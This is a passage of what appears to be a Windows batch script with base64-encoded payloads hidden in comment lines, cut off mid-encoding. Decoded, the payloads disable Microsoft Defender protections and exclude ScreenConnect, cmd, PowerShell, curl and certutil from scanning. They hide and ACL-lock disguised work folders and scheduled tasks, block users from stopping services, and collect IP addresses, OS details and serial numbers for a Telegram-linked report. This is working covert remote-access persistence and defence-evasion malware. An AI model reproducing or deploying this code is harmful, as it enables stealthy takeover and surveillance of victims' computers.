::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDRUMTcgLSBHRFJPUCBzdGF0ZSBmb3IgR3J5eGEgd2F0Y2ggZHJvcCBhbGVydHMN
::CnBhcmFtKA0KICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJp
::bmddJFN0YXRlLA0KICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywNCiAgICBbc3Ry
::aW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dz
::XFdFUlxUZW1wXC53dWNhY2hlJywNCiAgICBbc3RyaW5nXSRPbGRTdGF0ZSA9ICcn
::LA0KICAgIFtWYWxpZGF0ZVNldCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10k
::TW9kZSA9ICdyaWNoJywNCiAgICBbc3RyaW5nXSRCdWlsZCA9ICdPMTUnLA0KICAg
::IFtzdHJpbmddJENvdW50ID0gJzAnDQopDQoNCiRFcnJvckFjdGlvblByZWZlcmVu
::Y2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAn
::U2lsZW50bHlDb250aW51ZScNCnRyeSB7IFtOZXQuU2VydmljZVBvaW50TWFuYWdl
::cl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBl
::XTo6VGxzMTIgfSBjYXRjaCB7fQ0KDQpmdW5jdGlvbiBHZXQtQ2ZnIHsNCiAgICAk
::cGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnbm90aWZ5LmNmZycNCiAgICAkY2Zn
::ID0gQHt9DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0dXJu
::ICRjZmcgfQ0KICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcGF0aCB8IEZv
::ckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlxzKihbQS1a
::YS16MC05X10rKVxzKj1ccyooLiopXHMqJCcpIHsNCiAgICAgICAgICAgICRjZmdb
::JG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0uVHJpbSgpDQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICRjZmcNCn0NCg0KZnVuY3Rpb24gRXNjKFtzdHJpbmdd
::JHMpIHsNCiAgICBpZiAoJG51bGwgLWVxICRzKSB7IHJldHVybiAnJyB9DQogICAg
::cmV0dXJuICgkcyAtcmVwbGFjZSAnJicsICcmYW1wOycgLXJlcGxhY2UgJzwnLCAn
::Jmx0OycgLXJlcGxhY2UgJz4nLCAnJmd0OycpDQp9DQoNCmZ1bmN0aW9uIEdldC1Q
::dWJsaWNJcCB7DQogICAgZm9yZWFjaCAoJHUgaW4gQCgNCiAgICAgICAgICAgICdo
::dHRwczovL2FwaS5pcGlmeS5vcmcnLA0KICAgICAgICAgICAgJ2h0dHBzOi8vaWZj
::b25maWcubWUvaXAnLA0KICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
::bScNCiAgICAgICAgKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHIg
::PSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRp
::bWVvdXRTZWMgNg0KICAgICAgICAgICAgJGlwID0gKCRyLkNvbnRlbnQgfCBPdXQt
::U3RyaW5nKS5UcmltKCkNCiAgICAgICAgICAgIGlmICgkaXAgLW1hdGNoICdeXGR7
::MSwzfShcLlxkezEsM30pezN9JCcgLW9yICRpcCAtbWF0Y2ggJzonKSB7IHJldHVy
::biAkaXAgfQ0KICAgICAgICB9IGNhdGNoIHt9DQogICAgfQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtTG9jYWxJcHMgew0KICAgIHRyeSB7DQog
::ICAgICAgICRpcHMgPSBHZXQtTmV0SVBBZGRyZXNzIC1BZGRyZXNzRmFtaWx5IElQ
::djQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAg
::V2hlcmUtT2JqZWN0IHsgJF8uSVBBZGRyZXNzIC1ub3RsaWtlICcxMjcuKicgLWFu
::ZCAkXy5QcmVmaXhPcmlnaW4gLW5lICdXZWxsS25vd24nIH0gfA0KICAgICAgICAg
::ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1Vbmlx
::dWUNCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgkaXBzIC1qb2luICcsICcp
::IH0NCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdl
::dC1DaW1JbnN0YW5jZSBXaW4zMl9OZXR3b3JrQWRhcHRlckNvbmZpZ3VyYXRpb24g
::LUZpbHRlciAnSVBFbmFibGVkPVRydWUnIHwNCiAgICAgICAgICAgIEZvckVhY2gt
::T2JqZWN0IHsgJF8uSVBBZGRyZXNzIH0gfCBXaGVyZS1PYmplY3QgeyAkXyAtYW5k
::ICRfIC1ub3RsaWtlICcxMjcuKicgLWFuZCAkXyAtbm90bGlrZSAnKjoqJyB9DQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0
::IC1VbmlxdWUpIC1qb2luICcsICcpIH0NCiAgICB9IGNhdGNoIHt9DQogICAgcmV0
::dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Pc0luZm8gew0KICAgICRvID0g
::W29yZGVyZWRdQHsNCiAgICAgICAgQ2FwdGlvbiA9ICduL2EnOyBWZXJzaW9uID0g
::J24vYSc7IEJ1aWxkID0gJ24vYSc7IEFyY2ggPSAnbi9hJw0KICAgICAgICBEb21h
::aW4gPSAnbi9hJzsgSW5zdGFsbERhdGUgPSAnbi9hJzsgTGFzdEJvb3QgPSAnbi9h
::Jw0KICAgICAgICBDUFUgPSAnbi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1v
::ZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2EnDQogICAgICAgIFRvdGFsUkFNX0dC
::ID0gJ24vYSc7IERpc2tGcmVlX0dCID0gJ24vYSc7IERpc2tTaXplX0dCID0gJ24v
::YScNCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgJG9zID0gR2V0LUNpbUluc3Rh
::bmNlIFdpbjMyX09wZXJhdGluZ1N5c3RlbQ0KICAgICAgICAkby5DYXB0aW9uID0g
::JG9zLkNhcHRpb24NCiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uDQog
::ICAgICAgICRvLkJ1aWxkID0gJG9zLkJ1aWxkTnVtYmVyDQogICAgICAgICRvLkFy
::Y2ggPSAkb3MuT1NBcmNoaXRlY3R1cmUNCiAgICAgICAgJG8uSW5zdGFsbERhdGUg
::PSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1k
::ZCcpDQogICAgICAgICRvLkxhc3RCb290ID0gKCRvcy5MYXN0Qm9vdFVwVGltZSB8
::IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW0nKQ0KICAgICAgICAk
::by5Ub3RhbFJBTV9HQiA9IFttYXRoXTo6Um91bmQoJG9zLlRvdGFsVmlzaWJsZU1l
::bW9yeVNpemUgLyAxTUIsIDEpDQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQog
::ICAgICAgICRjcyA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Db21wdXRlclN5c3Rl
::bQ0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikgeyAk
::Y3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQ0KICAgICAgICAkby5N
::YW51ZmFjdHVyZXIgPSAkY3MuTWFudWZhY3R1cmVyDQogICAgICAgICRvLk1vZGVs
::ID0gJGNzLk1vZGVsDQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAg
::ICRvLkNQVSA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2Vzc29yIHwgU2Vs
::ZWN0LU9iamVjdCAtRmlyc3QgMSAtRXhwYW5kUHJvcGVydHkgTmFtZSkNCiAgICB9
::IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJG8uU2VyaWFsID0gKEdldC1D
::aW1JbnN0YW5jZSBXaW4zMl9CSU9TKS5TZXJpYWxOdW1iZXINCiAgICB9IGNhdGNo
::IHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGQgPSBHZXQtQ2ltSW5zdGFuY2UgV2lu
::MzJfTG9naWNhbERpc2sgLUZpbHRlciAiRGV2aWNlSUQ9J0M6JyINCiAgICAgICAg
::JG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRkLkZyZWVTcGFjZSAvIDFH
::QiwgMSkNCiAgICAgICAgJG8uRGlza1NpemVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
::LlNpemUgLyAxR0IsIDEpDQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAkbw0K
::fQ0KDQpmdW5jdGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7DQogICAg
::JHMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAnTk9UIElOU1RB
::TExFRCcgfQ0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScgLWYgJHMuU3Rh
::dHVzLCAkcy5TdGFydFR5cGUpDQp9DQoNCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRo
::KFtzdHJpbmddJHRuKSB7DQogICAgJG91dCA9ICYgc2NodGFza3MuZXhlIC9RdWVy
::eSAvVE4gJHRuIC9GTyBMSVNUIC9WIDI+JG51bGwNCiAgICBpZiAoJExBU1RFWElU
::Q09ERSAtbmUgMCAtb3IgLW5vdCAkb3V0KSB7DQogICAgICAgIHJldHVybiBAeyBQ
::cmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lORyc7IE5leHQgPSAnJzsg
::TGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9DQogICAgfQ0K
::ICAgICRtYXAgPSBAe30NCiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmpl
::Y3QgeyAiJF8iIH0pIC1qb2luICJgbiINCiAgICBmb3JlYWNoICgkbGluZSBpbiAk
::b3V0KSB7DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW146XSspOlxz
::KiguKilccyokJykgew0KICAgICAgICAgICAgJG1hcFskbWF0Y2hlc1sxXS5Ucmlt
::KCldID0gJG1hdGNoZXNbMl0uVHJpbSgpDQogICAgICAgIH0NCiAgICB9DQogICAg
::JHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddDQogICAgaWYgKC1ub3QgJHN0YXR1cykg
::eyAkc3RhdHVzID0gJG1hcFsnVGFzayBTdGF0dXMnXSB9DQogICAgaWYgKC1ub3Qg
::JHN0YXR1cykgeyAkc3RhdHVzID0gJ3ByZXNlbnQnIH0NCiAgICAkbmV4dCA9ICRt
::YXBbJ05leHQgUnVuIFRpbWUnXQ0KICAgIGlmICgtbm90ICRuZXh0KSB7ICRuZXh0
::ID0gJycgfQ0KICAgICRsYXN0ID0gJG1hcFsnTGFzdCBSdW4gVGltZSddDQogICAg
::aWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9DQogICAgJHJlc3VsdCA9ICRt
::YXBbJ0xhc3QgUmVzdWx0J10NCiAgICBpZiAoLW5vdCAkcmVzdWx0KSB7ICRyZXN1
::bHQgPSAnJyB9DQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQ0KICAgIGlm
::ICgtbm90ICR0cikgeyAkdHIgPSAkbWFwWydUYXNrIHRvIFJ1biddIH0NCiAgICAk
::b3VycyA9ICgkYmxvYiAtbWF0Y2ggJyg/aSlvd25fbW9uXC5jbWR8ZXRsX21vblwu
::Y21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgIyBQcmVzZW50IFdp
::bmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkgZm9y
::IHVzDQogICAgJGhlYWx0aHkgPSAkb3VycyAtYW5kICgoJHN0YXR1cyAtbWF0Y2gg
::J1JlYWR5fFJ1bm5pbmcnKSAtb3IgKCRzdGF0dXMgLWVxICdwcmVzZW50JykpDQog
::ICAgcmV0dXJuIEB7DQogICAgICAgIFByZXNlbnQgPSAkdHJ1ZQ0KICAgICAgICBP
::dXJzICAgID0gW2Jvb2xdJG91cnMNCiAgICAgICAgSGVhbHRoeSA9IFtib29sXSRo
::ZWFsdGh5DQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3VycykgeyAkc3RhdHVz
::IH0gZWxzZSB7ICdOT1RfT1VSUycgfSkNCiAgICAgICAgTmV4dCAgICA9ICRuZXh0
::DQogICAgICAgIExhc3QgICAgPSAkbGFzdA0KICAgICAgICBSZXN1bHQgID0gJHJl
::c3VsdA0KICAgICAgICBUciAgICAgID0gJChpZiAoJHRyKSB7ICR0ciB9IGVsc2Ug
::eyAnJyB9KQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LVJtbUhpdHMgew0KICAg
::ICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6IFNjcmVlbkNvbm5l
::Y3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuDQogICAgJHRva2VucyA9
::IEAoDQogICAgICAgICdBbnlEZXNrJywgJ1RlYW1WaWV3ZXInLCAndHZuc2VydmVy
::JywgJ0RXQWdlbnQnLCAnRFdTZXJ2aWNlJywgJ0xvZ01lSW4nLCAnTE1JR3VhcmRp
::YW4nLA0KICAgICAgICAnV2luVk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3Bs
::YXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1c3REZXNrJywgJ1JlbW90ZVBDJywg
::J0RhbWVXYXJlJywNCiAgICAgICAgJ0F0ZXJhQWdlbnQnLCAnQXRlcmEnLCAnTmlu
::amFSTU0nLCAnTmluamFPbmUnLCAnTmluamFSTU1BZ2VudCcsICdLYXNleWEnLCAn
::QWdlbnRNb24nLCAnUHVsc2V3YXknLCAnUEMgTW9uaXRvcicsICdTeW5jcm8nLCAn
::S2FidXRvJywNCiAgICAgICAgJ1N1cGVyT3BzJywgJ01hbmFnZUVuZ2luZScsICdV
::RU1TJywgJ0Rlc2t0b3AgQ2VudHJhbCcsICdFbmRwb2ludCBDZW50cmFsJywgJ1Nv
::bGFyV2luZHMgTVNQJywgJ0Nvbm5lY3RXaXNlIEF1dG9tYXRlJywgJ0xUU2Vydmlj
